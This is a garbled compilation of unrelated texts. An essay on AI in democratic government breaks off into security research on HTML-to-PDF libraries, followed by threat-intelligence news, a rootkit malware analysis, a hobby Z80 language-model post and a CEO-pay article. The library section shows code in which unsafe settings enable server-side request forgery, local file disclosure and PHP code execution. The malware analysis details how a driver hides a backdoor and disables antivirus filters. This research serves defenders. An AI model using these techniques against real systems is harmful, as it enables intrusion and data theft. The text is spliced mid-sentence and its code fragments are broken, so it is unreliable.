The technologies of artificial intelligence are already pervading many aspects of democratic government, affecting our lives in ways both large and small. This has occurred largely without our notice or consent. The result is a government incrementally transformed by AI rather than the singular technological overlord of the big screen.Let us begin with the executive branch. One of the most important functions of this branch of government is to administer the law, including the human services on which so many Americans rely. Many of these programs have long been operated by a mix of humans and machines, even if not previously using modern AI tools such as Large Language Models.A salient example is healthcare, where private insurers make widespread use of algorithms to review, approve, and deny coverage, even for recipients of public benefits like Medicare. While Biden-era guidance from the Centers for Medicare and Medicaid Services (CMS) largely blesses this use of AI by Medicare Advantage operators, the practice of overriding the medical care recommendations made by physicians raises profound ethical questions, with life and death implications for about thirty million Americans today.This April, the Trump administration reversed many administrative guardrails on AI, relieving Medicare Advantage plans from the obligation to avoid AI-enabled patient discrimination. This month, the Trump administration took a step further. CMS rolled out an aggressive new program that financially rewards vendors that leverage AI to reject rapidly prior authorization for "wasteful" physician or provider-requested medical services. The same month, the Trump administration also issued an executive order limiting the abilities of states to put consumer and patient protections around the use of AI.This shows both growing confidence in AI’s efficiency and a deliberate choice to benefit from it without restricting its possible harms. Critics of the CMS program have characterized it as effectively establishing a bounty on denying care; AI—in this case—is being used to serve a ministerial function in applying that policy. But AI could equally be used to automate a different policy objective, such as minimizing the time required to approve pre-authorizations for necessary services or to minimize the effort required of providers to achieve authorization.Next up is the judiciary. Setting aside concerns about activist judges and court overreach, jurists are not supposed to decide what law is. The function of judges and courts is to interpret the law written by others. Just as jurists have long turned to dictionaries and expert witnesses for assistance in their interpretation, AI has already emerged as a tool used by judges to infer legislative intent and decide on cases. In 2023, a Colombian judge was the first publicly to use AI to help make a ruling. The first known American federal example came a year later when United States Circuit Judge Kevin Newsom began using AI in his jurisprudence, to provide second "opinions" on the plain language meaning of words in statute. A District of Columbia Court of Appeals similarly used ChatGPT in 2025 to deliver an interpretation of what common knowledge is. And there are more examples from Latin America, the United Kingdom, India, and beyond.Given that these examples are likely merely the tip of the iceberg, it is also important to remember that any judge can unilaterally choose to consult an AI while drafting his opinions, just as he may choose to consult other human beings, and a judge may be under no obligation to disclose when he does.This is not necessarily a bad thing. AI has the ability to replace humans but also to augment human capabilities, which may significantly expand human agency. Whether the results are good or otherwise depends on many factors. These include the application and its situation, the characteristics and performance of the AI model, and the characteristics and performance of the humans it augments or replaces. This general model applies to the use of AI in the judiciary.Each application of AI legitimately needs to be considered in its own context, but certain principles should apply in all uses of AI in democratic contexts. First and foremost, we argue, AI should be applied in ways that decentralize rather than concentrate power. It should be used to empower individual human actors rather than automating the decision-making of a central authority. We are open to independent judges selecting and leveraging AI models as tools in their own jurisprudence, but we remain concerned about Big Tech companies building and operating a dominant AI product that becomes widely used throughout the judiciary.This principle brings us to the legislature. Policymakers worldwide are already using AI in many aspects of lawmaking. In 2023, the first law written entirely by AI was passed in Brazil. Within a year, the French government had produced its own AI model tailored to help the Parliament with the consideration of amendments. By the end of that year, the use of AI in legislative offices had become widespread enough that twenty percent of state-level staffers in the United States reported using it, and another forty percent were considering it.These legislative members and staffers, collectively, face a significant choice: to wield AI in a way that concentrates or distributes power. If legislative offices use AI primarily to encode the policy prescriptions of party leadership or powerful interest groups, then they will effectively cede their own power to those central authorities. AI here serves only as a tool enabling that handover.On the other hand, if legislative offices use AI to amplify their capacity to express and advocate for the policy positions of their principals—the elected representatives—they can strengthen their role in government. Additionally, AI can help them scale their ability to listen to many voices and synthesize input from their constituents, making it a powerful tool for better realizing democracy. We may prefer a legislator who translates his principles into the technical components and legislative language of bills with the aid of a trustworthy AI tool executing under his exclusive control rather than with the aid of lobbyists executing under the control of a corporate patron.Examples from around the globe demonstrate how legislatures can use AI as tools for tapping into constituent feedback to drive policymaking. The European civic technology organization Make.org is organizing large-scale digital consultations on topics such as European peace and defense. The Scottish Parliament is funding the development of open civic deliberation tools such as Comhairle to help scale civic participation in policymaking. And Japanese Diet member Takahiro Anno and his party Team Mirai are showing how political innovators can build purpose-fit applications of AI to engage with voters.AI is a power-enhancing technology. Whether it is used by a judge, a legislator, or a government agency, it enhances an entity’s ability to shape the world. This is both its greatest strength and its biggest danger. In the hands of someone who wants more democracy, AI will help that person. In the hands of a society that wants to distribute power, AI can help to execute that. But, in the hands of another person, or another society, bent on centralization, concentration of power, or authoritarianism, it can also be applied toward those ends.We are not going to be fully governed by AI anytime soon, but we are already being governed with AI—and more is coming. Our challenge in these years is more a social than a technological one: to ensure that those doing the governing are doing so in the service of democracy.This essay was written with Nathan E.

```

After downloading the generated PDF, we can extract the file using the pdfdetach application.

#### Misconfiguration 2. Server-Side Request Forgery (Blind SSRF) and Files or Directories Accessible to External Parties via the watermarkimage tag

_Researcher: Nikita Sveshnikov_

With `showWatermarkImage` enabled ( _marker 1_) in the mpdf/mpdf library’s configuration, we can address local or remote resources on behalf of the server or embed local images in the generated PDF file as a watermark.

Web application source code

```
'; $mpdf->WriteHTML($html); $mpdf->showWatermarkImage = true; // marker 1 $mpdf->Output();
```

As a result, the watermark in the generated PDF file became an arbitrary image.

## The KnpLabs/snappy library

### Description

KnpLabs/snappy is a PHP library for generating thumbnails, snapshots, or PDFs from a URL or an HTML page.

**Identifying the library and its version**

KnpLabs/snappy is a wrapper for wkhtmltopdf/wkhtmltoimage. Therefore, “snappy” will not appear in the PDF document properties. The Application field will show wkhtmltopdf with a version, and the PDF producer will be “Qt”. If you encounter wkhtmltopdf older than 0.12.6 (still common in practice), watch out for CVE‑2022‑35583.

### Intentional behavior

The demonstration uses KnpLabs/snappy version 1.4.4.

Installing a specific version of KnpLabs/snappy

```
$ composer require knplabs/knp-snappy:1.4.4
```

We also have to install wkhtmltopdf on the system For the demonstration, we use the latest available version, for example, wkhtmltox\_0.12.6.1-3.jammy\_amd64.deb (https://github.com/wkhtmltopdf/packaging/releases/tag/0.12.6.1-3).

```
$ sudo dpkg -i ./wkhtmltox_0.12.6.1-3.jammy_amd64.deb
```

Both KnpLabs/snappy and wkhtmltopdf vendors warn that any user-supplied HTML data must be sanitized.

#### Intentional behavior 1. Server-Side Request Forgery

_Researcher: Nikita Sveshnikov_

KnpLabs/snappy saves the provided HTML to a file and then processes it using wkhtmltopdf. The wkhtmltopdf library then sends requests to external and internal URLs and ports.

Behavior depends on the tag used:

- The iframe tag ( _marker 1_) enables full Server-Side Request Forgery.
- The  tag enables Server-Side Request Forgery (Blind SSRF) ( _marker 2_).

Web application source code

```
 HTML; $pdf = new Pdf($wkhtmltopdfPath); $pdfContent = $pdf->getOutputFromHtml($maliciousHtmlPayload); header('Content-Type: application/pdf'); header('Content-Disposition: inline; filename="output.pdf"'); echo $pdfContent;
```

Example of successfully obtaining and viewing a server response in the generated PDF with the help of the iframe tag:

### Misconfiguration

#### Misconfiguration 1. Files or Directories Accessible to External Parties

_Researcher: Nikita Sveshnikov_

If `enable-local-file-access` is set ( _marker 1_), the library allows us to embed local images into the generated PDF.

**Note on paths**

The snappy and wkhtmltopdf libraries do not sanitize paths, allowing path traversal. However, by default the current directory for snappy is “/”.

Web application source code

```
 HTML; $pdf = new Pdf($wkhtmltopdfPath); $pdf->setOption('enable-local-file-access', true); // marker 1 $pdfContent = $pdf->getOutputFromHtml($maliciousHtmlPayload); header('Content-Type: application/pdf'); header('Content-Disposition: inline; filename="output.pdf"'); echo $pdfContent;
```

## The dompdf/dompdf library

### Description

The dompdf/dompdf library is an open-source PHP library that converts HTML to PDF. It is a style-driven renderer: it downloads and reads external stylesheets, inline style tags, and the style attributes of individual HTML elements. It also supports most presentational HTML attributes.

## Misconfiguration

Severe vulnerabilities have already been found in dompdf/dompdf by other researchers, and the vendor has always promptly addressed such issues. However, misconfigurations can reintroduce dangerous scenarios. Below are the most dangerous scenarios.

The dompdf/dompdf version used in this research is 3.1.0.

```
$ composer require dompdf/dompdf:3.1.0
```

#### Misconfiguration 1. Remote code execution (RCE)

_Researcher: Nikita Sveshnikov_

If `isPhpEnabled` is set to true ( _marker 1_), dompdf/dompdf will execute embedded PHP code from the HTML markup.

Web application source code

```
set('isPhpEnabled', true); // marker 1 $dompdf = new Dompdf($options); // Minimal HTML $html = ''; $dompdf->loadHtml($html); $dompdf->render(); $dompdf->stream("test_php.pdf", ["Attachment" => false]);
```

Let’s read the `/tmp/rce` file to verify that the id command was executed.

#### Misconfiguration 2. Server-Side Request Forgery (Blind SSRF) via the img tag and the src attribute

_Researcher: Nikita Sveshnikov_

With `isRemoteEnabled` enabled ( _marker 1_), dompdf/dompdf will retrieve external files by URL, including images, fonts, and styles. This may lead to SSRF attacks, as the library will attempt to address even internal services of the network.

To mitigate, use `setAllowedRemoteHosts` to restrict dompdf/dompdf to a whitelist of domains and IP addresses; the library will only make requests to those hosts.

Web application source code

```
set('isRemoteEnabled', true); // marker 1 $dompdf = new Dompdf($options); // Minimal HTML $html = ''; $dompdf->loadHtml($html); $dompdf->render(); $dompdf->stream("test_ssrf.pdf", ["Attachment" => false]);
```

Demonstration of server-side request execution.

#### Misconfiguration 3. Files or Directories Accessible to External Parties via the image tag and the src attribute

_Researcher: Nikita Sveshnikov_

The `setChroot` method restricts library access to a specified directory. If chroot is misconfigured, for example, points too high in the directory tree (see _marker 1_), access breaks out of the dompdf folder, allowing `file://` to read any local files the process can access.

Web application source code

```
setChroot('/'); // marker 1 $dompdf = new Dompdf($options); // Minimal HTML $html = ''; $dompdf->loadHtml($html); $dompdf->render(); $dompdf->stream("test_lfr.pdf", ["Attachment" => false]);
```

## The LibrePDF/OpenPDF library

### Description

LibrePDF/OpenPDF is a free, open-source Java library for creating and editing PDFs, licensed under LGPL and MPL. OpenPDF is a fork of iText.

### Intentional behavior

The LibrePDF/OpenPDF developer warns that the library is not a sandboxed or hardened environment. It processes input such as file paths, image sources, font names, and HTML content as-is, without performing input validation, authentication, or permission checks (https://github.com/LibrePDF/OpenPDF/blob/master/Security.md).

OpenPDF processes input data such as file paths, image sources, font names, and HTML content as-is, without performing input validation, authentication, or permission checks.

It is the sole responsibility of the application developer to ensure that all input passed into OpenPDF is trusted, sanitized, and safe.

#### Intentional behavior 1. Server-Side Request Forgery (Blind SSRF) and Files or Directories Accessible to External Parties via the img tag and src attribute

_Researchers: Aleksey Solovev, Nikita Sveshnikov_

In LibrePDF/OpenPDF, the HTMLWorker class does not filter `src` attribute values when parsing img tags in HTML. This creates two related risks: embedding local files in the resulting PDF and executing HTTP requests on behalf of the server. If the `src` attribute contains a URL ( _marker 2_), the library attempts to fetch the resource from that address. If it contains a path to a local image ( _marker 1_), the library embeds the file’s contents into the resulting PDF.

Application source code

```
package com.example; import java.io.FileOutputStream; import java.io.IOException; import java.io.StringReader; import com.lowagie.text.Document; import com.lowagie.text.DocumentException; import com.lowagie.text.html.simpleparser.HTMLWorker; import com.lowagie.text.pdf.PdfWriter; public class App { public static void main(String[] args) { Document document = new Document(); try { PdfWriter.getInstance(document, new FileOutputStream("output.pdf")); document.open(); String htmlString = "" + // marker 1 ""; // marker 2 HTMLWorker htmlWorker = new HTMLWorker(document); htmlWorker.parse(new StringReader(htmlString)); htmlWorker.close(); } catch (DocumentException | IOException e) { e.printStackTrace(); } finally { if (document != null && document.isOpen()) { document.close(); } } } }
```

Note that OpenPDF does not support all HTML features, which can complicate page layout.

#### Intentional behavior 2. Server-Side Request Forgery (Blind SSRF) and Files or Directories Accessible to External Parties via the img tag and src attribute

_Researcher: Nikita Sveshnikov_

A similar mechanism exists in the `HtmlParser` class, which likewise accepts unrestricted paths in the `img` tag’s `src` attribute, both absolute ( _marker 2_) and relative ( _marker 1_). `HtmlParser` is susceptible to Blind SSRF ( _marker 3_). We’ll demonstrate all of this in a single application.

Application source code

```
package com.example; import java.io.FileOutputStream; import java.io.IOException; import java.io.StringReader; import com.lowagie.text.Document; import com.lowagie.text.DocumentException; import com.lowagie.text.html.HtmlParser; import com.lowagie.text.pdf.PdfWriter; public class App { public static void main(String[] args) { String htmlContent = "\n" + " \n" + " \n" + " \n" + " \n" + // marker 1 " \n" + " \n" + " \n" + " \n" + // marker 2 " \n" + " \n" + "" + // marker 3 ""; Document document = new Document(); try { PdfWriter.getInstance(document, new FileOutputStream("output.pdf")); document.open(); HtmlParser.parse(document, new StringReader(htmlContent)); } catch (DocumentException | IOException e) { e.printStackTrace(); } finally { if (document != null && document.isOpen()) { document.close(); } } } }
```

Demonstration of server‑side request execution and embedding arbitrary images into the generated PDF.

## Additional notes

### Default images

Sometimes you may not know the absolute or relative paths to private images. One workaround is to embed images that are likely present on the system at known locations into a generated PDF file.

In the figure below, we see images in the `/usr/share/apache2` and `/usr/share/doc` folders. As a proof of concept, you can prepare a list of potential image paths and include them all in the HTML markup passed to the library for PDF rendering.

## Conclusion

After reviewing several HTML-to-PDF libraries, we have reached the following conclusions:

- There is a high likelihood of embedding confidential images via absolute or relative paths, potentially exposing private information.
- There is a risk of SSRF attacks to external and internal addresses and ports from the server.
- By deleting files during vulnerability exploitation, an attacker may cause a system DoS or remove files needed for security checks.
- Pay close attention to regular expressions: poorly written expressions can lead to ReDoS (Regex DoS).

Recommendations for developers: keep these libraries up to date, account for their intentional behaviors and potential misconfigurations, and sanitize untrusted input as needed.

Trends matter because they almost always provide a good indication of what’s coming next.If there’s one thing that became very clear in 2025, it’s that malware is no longer focused on Windows alone. We’ve seen some major developments, especially in campaigns targeting Android and macOS. Unfortunately, many people still don’t realize that protecting smartphones, tablets, and other connected devices is just as essential as securing their laptops.Banking Trojans on Android are not new, but their level of sophistication continues to rise. These threats continue to be a major problem in 2025, often disguising themselves as fake apps to steal credentials or stealthily take over devices. A recent wave of advanced banking Trojans, such as Herodotus, can mimic human typing behaviors to evade detection, highlighting just how refined these attacks have become. Android malware also includes adware that aggressively pushes intrusive ads through free apps, degrading both the user experience and overall security.Several Trojans were found to use overlays, which are fake login screens appearing on top of real banking and cryptocurrency apps. They can read what’s on the screen, so when someone enters their username and password, the malware steals them.One of the most notable developments for Mac users was the expansion of the notorious ClickFix campaign to macOS. Early in 2025, I described how criminals used fake CAPTCHA sites and a clipboard hijacker to provide instructions that led visitors ro infect their own machines with the Lumma infostealer.ClickFix is the name researchers have since given to this type of campaign, where users are tricked into running malicious commands themselves. On macOS, this technique is being used to distribute both AMOS stealers and the Rhadamanthys infostealer.Malware developers increasingly use cross-platform languages such as Rust and Go to create malware that can run on Windows, macOS, Linux, mobile, and even Internet of Things (IoT) devices. This enables flexible targeting and expands the number of potential victims. Malware-as-a-Service (MaaS) models are on the rise, offering these tools for rent or purchase on underground markets, further professionalizing malware development and distribution.We’ve also seen consistent growth in Remote Access Trojan (RAT) activity, often used as an initial infection method. There’s also been a rise in finance-focused attacks, including cryptocurrency and banking-related targets, alongside widespread stealer malware driving data breaches.What does this mean for 2026?Taken together, these trends point to a clear shift. Cybercriminals are increasingly focusing on operating systems beyond Windows, combining advanced techniques and social engineering tailored specifically to mobile and macOS.We don’t just report on threats—we remove them]]></content:encoded></item><item><title>29th December – Threat Intelligence Report</title><link>https://research.checkpoint.com/2025/29th-december-threat-intelligence-report/</link><author>lorenf</author><category>threatintel</category><pubDate>Mon, 29 Dec 2025 11:33:48 +0000</pubDate><source url="https://research.checkpoint.com/">Check Point Research</source><content:encoded><![CDATA[Romanian Waters, the country’s national water management authority, was hit by a ransomware attack that resulted in nearly 1,000 computer systems across national and regional offices being encrypted. The attack affected geographic information systems, databases, email, web servers, and Windows workstations. Operational technology controlling water infrastructure was not impacted, and no data leakage has been reported, but key IT services were disrupted across the organization.France’s postal service La Poste has suffered a cyber-attack that disrupted key digital systems, impacting online parcel tracking, mail distribution, and banking services for customers of both the postal service and La Banque Postale. Some services were temporarily unavailable, with no evidence of data compromise. The attack was claimed by the pro-Russian hacktivist group NoName057(16).Insurance giant Aflac has confirmed a data breach they experienced in June that resulted in the theft of sensitive files containing insurance claims, health data and Social Security numbers. The breach affected personal details of approximately 22.7 million individuals in its US business. The attack has been attributed to Scattered Spider threat group.Point Harmony Endpoint provides protection against this threatJapan’s leading carmaker Nissan Motor Corporation has acknowledged a data breach that resulted in the exposure of personal information for approximately 21,000 customers from Nissan Fukuoka Sales Corporation including names, addresses, phone numbers, email addresses, and sales operation data. The incident occurred after unauthorized access to Red Hat data servers led to the leak, but financial data was not affected. The Crimson Collective threat actor claimed responsibility for the initial breach, with ShinyHunters later hosting samples of the stolen data.Trust Wallet, a popular non-custodial cryptocurrency wallet, has disclosed a cyber-attack involving a compromised Chrome extension update. The attack exfiltrated sensitive wallet data, including seed phrases, to a malicious domain, resulting in at least $7 million in losses. The incident primarily affected users of Chrome extension version 2.68.0, allowing attackers to drain wallets.Ubisoft’s live service game Rainbow Six Siege (R6) has confirmed a cyber-attack in which threat actors abused internal systems to manipulate bans, unlock all cosmetics and developer-only skins, and distribute around $13.33 million worth of in-game currency worldwide.Baker University has encountered a data breach that resulted in attackers accessing its network and stealing sensitive information belongs to 53,624 students, alumni, staff, and affiliates of the university, such as names, Social Security numbers, financial account details, and medical records.VULNERABILITIES AND PATCHESA high-severity memory-read vulnerability, CVE-2025-14847, dubbed “MongoBleed” has been identified in multiple MongoDB Server versions, allowing unauthenticated remote attackers to exploit a zlib implementation flaw and potentially access uninitialized heap memory. The issue, caused by improper handling of length parameter inconsistency (CWE-130), may permit arbitrary code execution and system compromise. Affected versions include MongoDB 4.0 through 8.2.3.Details on a critical serialization injection vulnerability in LangChain Core were disclosed. CVE-2025-68664 (CVSS 9.3) affects langchain-core, where unescaped user-controlled dictionaries with lc keys are treated as trusted objects during deserialization, enabling secret extraction, prompt injection, and potentially arbitrary code execution.A critical buffer overflow vulnerability, CVE-2025-68615, in Net-SNMP’s snmptrapd daemon can be triggered remotely via a specially crafted packet. The issue has a CVSS score of 9.8 and may allow unauthenticated attackers to achieve remote code execution or cause service crashes. Patches are available, and the vulnerability is addressed in Net-SNMP versions 5.9.5 and 5.10.pre2.THREAT INTELLIGENCE REPORTSCheck Point researchers describe a phishing campaign in which attackers abused Google Cloud Application Integration’s “Send Email” workflow to send over 9,000 spoofed Google notification emails from a Google address. The messages targeted manufacturing, technology, and finance sectors and used multi-step redirection through Google domains to lead victims to a Microsoft-themed credential harvesting site. Most victims located in the US, Asia-Pacific, and Europe.Researchers uncovered a two-year Evasive Panda campaign using adversary-in-the-middle DNS poisoning to deliver MgBot via fake updaters and stealthy loaders. The chain used multi-stage shellcode, hybrid encryption, and DLL sideloading to run MgBot in memory, with victim-specific payloads tied to machines via DPAPI and RC5. Attackers poisoned legitimate domains, injected into signed system processes for persistence, and updated configs with hardcoded C2s.Point Harmony Endpoint provides protection against this threatA Webrat campaign leveraged fake GitHub repositories masquerading as exploit and proof-of-concept code for high-severity CVEs, targeting gamers, students, and inexperienced security researchers. The attack uses droppers to elevate privileges, disable Windows Defender, and deploy the Webrat backdoor, enabling remote control, credential theft, keylogging, and device surveillance.Researchers found lotusbail, a malicious npm package masquerading as a WhatsApp Web API library that intercepts messages and steals session/auth data, contacts, and media via WebSocket tampering and device-pairing hijack.

The driver file is signed with an old, stolen, or leaked digital certificate and registers as a mini-filter driver on infected machines. Its end-goal is to inject a backdoor Trojan into the system processes and provide protection for malicious files, user-mode processes, and registry keys.Our analysis indicates that the final payload injected by the driver is a new sample of the ToneShell backdoor, which connects to the attacker’s servers and provides a reverse shell, along with other capabilities. The ToneShell backdoor is a tool known to be used exclusively by the HoneyMyte (aka Mustang Panda or Bronze President) APT actor and is often used in cyberespionage campaigns targeting government organizations, particularly in Southeast and East Asia.The command-and-control servers for the ToneShell backdoor used in this campaign were registered in September 2024 via NameCheap services, and we suspect the attacks themselves to have begun in February 2025. We’ve observed through our telemetry that the new ToneShell backdoor is frequently employed in cyberespionage campaigns against government organizations in Southeast and East Asia, with Myanmar and Thailand being the most heavily targeted.The driver file is signed with a digital certificate from Guangzhou Kingteller Technology Co., Ltd., with a serial number of 08 01 CC 11 EB 4D 1D 33 1E 3D 54 0C 55 A4 9F 7F. The certificate was valid from August 2012 until 2015.We found multiple other malicious files signed with the same certificate which didn’t show any connections to the attacks described in this article. Therefore, we believe that other threat actors have been using it to sign their malicious tools as well. The following image shows the details of the certificate.Technical details of the malicious driverThe filename used for the driver on the victim’s machine is . The registry key created for the driver’s service uses the same name, The malicious driver contains two user-mode shellcodes, which are embedded into the .data section of the driver’s binary file. The shellcodes are executed as separate user-mode threads. The rootkit functionality protects both the driver’s own module and the user-mode processes into which the backdoor code is injected, preventing access by any process on the system.To obfuscate the actual behavior of the driver module, the attackers used dynamic resolution of the required API addresses from hash values.The malicious driver first retrieves the base address of the  and  by calling  with the  set to SYSTEM_MODULE_INFORMATION. It then iterates through this system information and searches for the desired DLLs by name, noting the  of each.Once the base addresses of the libraries are obtained, the driver uses a simple hashing algorithm to dynamically resolve the required API addresses from  and .The hashing algorithm is shown below. The two variants of the seed value provided in the comment are used in the shellcodes and the final payload of the attack.Protection of the driver fileThe malicious driver registers itself with the Filter Manager using  and sets up a pre-operation callback. This callback inspects I/O requests for  and triggers a malicious handler when certain  values are detected. The handler then checks whether the targeted file object is associated with the driver; if it is, it forces the operation to fail by setting  to . The relevant  values include:FileDispositionInformationFileRenameInformationBypassAccessCheckFileDispositionInformationExFileRenameInformationExBypassAccessCheckThese classes correspond to file-delete and file-rename operations. By monitoring them, the driver prevents itself from being removed or renamed – actions that security tools might attempt when trying to quarantine it.Protection of registry keysThe driver also builds a global list of registry paths and parameter names that it intends to protect. This list contains the following entries:ProjectConfiguration\InstancesProjectConfiguration InstanceTo guard these keys, the malware sets up a  routine, registering it through . To do so, it must assign itself an value. Microsoft governs altitude assignments for mini-filters, grouping them into Load Order categories with predefined altitude ranges. A filter driver with a low numerical altitude is loaded into the I/O stack below filters with higher altitudes. The malware uses a hardcoded starting point of  and creates altitude strings in the format , where  ranges from 0 to 10,000.The malware then begins attempting to register the callback using the first generated altitude. If the registration fails with STATUS_FLT_INSTANCE_ALTITUDE_COLLISION, meaning the altitude is already taken, it increments the value and retries. It repeats this process until it successfully finds an unused altitude.The callback monitors four specific registry operations. Whenever one of these operations targets a key from its protected list, it responds with 0xC0000022 (STATUS_ACCESS_DENIED), blocking the action. The monitored operations are:Microsoft designates the  altitude range for the  Load Order Group. The malware’s chosen altitude exceeds this range. Since filters with lower altitudes sit deeper in the I/O stack, the malicious driver intercepts file operations before legitimate low-altitude filters like antivirus components, allowing it to circumvent security checks.Finally, the malware tampers with the altitude assigned to , a key Microsoft Defender driver. It locates the registry entry containing the driver’s altitude and changes it to , effectively preventing WdFilter from being loaded into the I/O stack.Protection of user-mode processesThe malware sets up a list intended to hold protected process IDs (PIDs). It begins with 32 empty slots, which are filled as needed during execution. A status flag is also initialized and set to 1 to indicate that the list starts out empty.Next, the malware uses  to register two callbacks that intercept process-related operations. These callbacks apply to both OB_OPERATION_HANDLE_CREATE and OB_OPERATION_HANDLE_DUPLICATE, and both use a malicious pre-operation routine.This routine checks whether the process involved in the operation has a PID that appears in the protected list. If so, it sets the  field in the  structure to 0, effectively denying any access to the process.The malware also registers a callback routine by calling PsSetCreateProcessNotifyRoutine. These callbacks are triggered during every process creation and deletion on the system. This malware’s callback routine checks whether the parent process ID (PPID) of a process being deleted exists in the protected list; if it does, the malware removes that PPID from the list. This eventually removes the rootkit protection from a process with an injected backdoor, once the backdoor has fulfilled its responsibilities.The driver delivers two user-mode payloads. spawns an  process and injects a small delay-inducing shellcode.  The PID of this new  instance is written to a file for later use.is the final component – the ToneShell backdoor – and is later injected into that same  process.The malicious driver searches for a high-privilege target process by iterating through PIDs and checking whether each process exists and runs under . Once it finds one, it customizes the first payload using random event names, file names, and padding bytes, then creates a named event and injects the payload by attaching its current thread to the process, allocating memory, and launching a new thread.After injection, it waits for the payload to signal the event, reads the PID of the newly created  process from the generated file, and adds it to its protected process list. It then similarly customizes the second payload (ToneShell) using random event name and random padding bytes, then creates a named event and injects the payload by attaching to the process, allocating memory, and launching a new thread.Once the ToneShell backdoor finishes execution, it signals the event. The malware then removes the  PID from the protected list, waits 10 seconds, and attempts to terminate the process.The final stage of the attack deploys , a backdoor previously linked to operations by the HoneyMyte APT group and discussed in earlier reporting (see Malpedia and MITRE). Notably, this is the first time we’ve seen ToneShell delivered through a , giving it protection from user-mode monitoring and benefiting from the rootkit capabilities of the driver that hides its activity from security tools.Earlier ToneShell variants generated a 16-byte GUID using  and stored it as a host identifier. In contrast, this version checks for a file named C:\ProgramData\MicrosoftOneDrive.tlb, validating a 4-byte marker inside it. If the file is absent or the marker is invalid, the backdoor derives a new pseudo-random 4-byte identifier using system-specific values (computer name, tick count, and PRNG), then creates the file and writes the marker. This becomes the unique ID for the infected host.The samples we have analyzed contact two command-and-control servers:ToneShell communicates with its C2 over raw TCP on port 443 while disguising traffic using . This version imitates the first bytes of a TLS 1.3 record () instead of the TLS 1.2 pattern used previously. After this three-byte marker, each packet contains a size field and an encrypted payload. Fake TLS marker Payload length Encrypted with a rolling XOR keyThe backdoor supports a set of remote operations, including file upload/download, remote shell functionality, and session control. The command set includes:Create temporary file for incoming dataEstablish remote shell via pipeWe assess with high confidence that the activity described in this report is linked to the  threat actor. This conclusion is supported by the use of the  backdoor as the final-stage payload, as well as the presence of additional tools long associated with HoneyMyte – such as , and the  USB worm – on the impacted systems.HoneyMyte’s 2025 operations show a noticeable evolution toward using  to deploy ToneShell, improving both stealth and resilience. In this campaign, we observed a new ToneShell variant delivered through a kernel-mode driver that carries and injects the backdoor directly from its embedded payload. To further conceal its activity, the driver first deploys a small user-mode component that handles the final injection step. It also uses multiple obfuscation techniques, callback routines, and notification mechanisms to hide its API usage and track process and registry activity, ultimately strengthening the backdoor’s defenses.Because the shellcode executes entirely in memory,  becomes essential for uncovering and analyzing this intrusion. Detecting the injected shellcode is a key indicator of ToneShell’s presence on compromised hosts.To protect themselves against this threat, organizations should:By following these recommendations, organizations can reduce their risk of being compromised by the HoneyMyte APT group and other similar threats.]]></content:encoded></item><item><title>27 Malicious npm Packages Used as Phishing Infrastructure to Steal Login Credentials</title><link>https://thehackernews.com/2025/12/27-malicious-npm-packages-used-as.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjbarqmk-H0SfVP8X3eR-wcY-UAzQs4vgDfk6mZCaOhgsKNAmf1pLBT_CfB6bMSHARl1UMwvkmd1SL9INOF4KyHSMr7eCO4lWF6745uHql2CwA4iWIGik-6yynnmPNOjdNi9FMXD6pCx3GIJ8T8em0Y6kvg-98a8AuatSM9Ql4zgApKEPOP1pySjfOrblmd/s1600/npm-login.jpg" length="" type=""/><pubDate>Mon, 29 Dec 2025 09:44:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[Cybersecurity researchers have disclosed details of what has been described as a "sustained and targeted" spear-phishing campaign that has published over two dozen packages to the npm registry to facilitate credential theft.

I wanted to find out, and had some spare time over the holidays.Z80-μLM is a character-level language model with 2-bit quantized weights ({-2,-1,0,+1}) that runs on a Z80 with 64KB RAM. The entire thing: inference, weights, chat UI, it all fits in a 40KB .COM file that you can run in a CP/M emulator and hopefully even real hardware!It won't write your emails, but it can be trained to play a stripped down version of 20 Questions, and is sometimes able to maintain the illusion of having simple but terse conversations with a distinct personality.The extreme constraints nerd-sniped me and forced interesting trade-offs: trigram hashing (typo-tolerant, loses word order), 16-bit integer math, and some careful massaging of the training data meant I could keep the examples 'interesting'.The key was quantization-aware training that accurately models the inference code limitations. The training loop runs both float and integer-quantized forward passes in parallel, scoring the model on how well its knowledge survives quantization. The weights are progressively pushed toward the 2-bit grid using straight-through estimators, with overflow penalties matching the Z80's 16-bit accumulator limits. By the end of training, the model has already adapted to its constraints, so no post-hoc quantization collapse.Eventually I ended up spending a few dollars on Claude API to generate 20 questions data (see examples/guess/GUESS.COM), I hope Anthropic won't send me a C&D for distilling their model against the ToS ;PBut anyway, happy code-golf season everybody :)]]></content:encoded></item><item><title>You can make up HTML tags</title><link>https://maurycyz.com/misc/make-up-tags/</link><author>todsacerdoti</author><category>dev</category><pubDate>Mon, 29 Dec 2025 02:47:44 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[

This article was originally published on 26 April 2021 and asks, as Executive pay continues to rise, does a company need a CEO at all?Executive pay is often the most contentious item at an AGM, but this year is clearly exceptional. The people running companies that have been severely impacted by Covid-19 can’t be blamed for the devastation of their revenues by the pandemic, but they also can’t take credit for the government stimulus that has kept them afloat. Last week, for example, nearly 40 per cent of shareholders in the estate agents Foxtons voted against its chief executive officer, Nicholas Budden, receiving a bonus of just under £1m; Foxtons has received about £7m in direct government assistance and is benefiting from the government’s continued inflation of the housing market. The person who has done most to ensure Foxtons’ ongoing good fortune is not Nicholas Budden but Rishi Sunak. Under the Enterprise and Regulatory Reform Act, executive pay is voted on at least every three years, and this process forces shareholders and the public to confront how much the people at the top take home. Tim Steiner, the highest-paid CEO in the FTSE 100, was paid £58.7m in 2019 for running Ocado, which is 2,605 times the median income of his employees for that year, while the average FTSE100 CEO makes more than £15,000 a day.  As the High Pay Centre’s annual assessment of CEO pay points out, a top-heavy wage bill extends beyond the CEO, and could be unsustainable for any company this year. “When one considers high earners beyond the CEO”, says the report, ”there is actually quite significant potential for companies to safeguard jobs and incomes by asking higher-paid staff to make sacrifices”.In the longer term, as companies commit to greater automation of many roles, it’s pertinent to ask whether a company needs a CEO at all.  A few weeks ago Christine Carrillo, an American tech CEO, raised this question herself when she tweeted a spectacularly tone-deaf appreciation of her executive assistant, whose work allows Carrillo to “write [and] surf every day” as well as “cook dinner and read every night”. In Carrillo’s unusually frank description of the work her EA does – most of her emails, most of the work on fundraising, playbooks, operations, recruitment, research, updating investors, invoicing “and so much more” – she guessed that this unnamed worker “saves me 60% of time”.Predictably, a horde arrived to point out that if someone else is doing 60 per cent of 